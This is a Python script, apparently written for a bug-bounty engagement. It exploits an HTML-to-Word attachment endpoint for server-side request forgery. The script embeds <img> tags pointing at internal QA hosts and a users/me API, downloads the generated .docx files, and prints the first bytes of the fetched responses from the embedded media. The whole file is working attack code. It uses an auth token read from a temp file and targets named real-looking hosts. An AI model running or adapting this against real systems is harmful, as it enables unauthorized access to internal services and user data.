import json,subprocess,os,uuid,zipfile,io
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
def post(path,body):
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+TA,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
def get(path):
    cmd=['curl','-s','-m','40',H+path,'-H','token: '+TA,'-H',BB]
    return json.loads(subprocess.run(cmd,capture_output=True,text=True).stdout)
tag='zx'+uuid.uuid4().hex[:8]
# internal endpoints returning JSON/text — force them through an image extension
targets=[
 ("int-version.ico","http://integrations.qa.soxhubapp.com/version"),
 ("int-health.ico","http://integrations.qa.soxhubapp.com/api/v1/health"),
 ("app-users-me.ico","https://bugbounty1.qe.optrostaging.ai/api/v1/users/me"),
 ("app-root.ico","https://bugbounty1.qe.optrostaging.ai/"),
]
for label,url in targets:
    c,b=post('/api/v1/attachments/html',
       {"html":f'<h1>ZX</h1><img src="{url}" width="400" height="400">',
        "type":"word","attachableType":"AuditableEntity","attachableId":"104",
        "fileName":f"zx-{tag}-{label}"})
    if c!='200':
        print(f"  {label:20} gen={c}"); continue
    aid=json.loads(b)['attachmentId']
    a=get(f'/api/v1/attachments/{aid}')['attachments'][0]
    f=get(f"/api/v1/files/{a['file_id']}")['files'][0]
    subprocess.run(['curl','-s','-m','60','-o','/tmp/h.docx',f['url']])
    d=open('/tmp/h.docx','rb').read()
    try:
        z=zipfile.ZipFile(io.BytesIO(d))
        media=[(n,len(z.read(n))) for n in z.namelist() if 'media' in n]
        print(f"  {label:20} docx={len(d):>6}B media={media}")
        for m,sz in media:
            if sz:
                blob=z.read(m)
                print(f"      {sz}B head={blob[:160]!r}")
    except Exception as e:
        print(f"  {label:20} not zip")
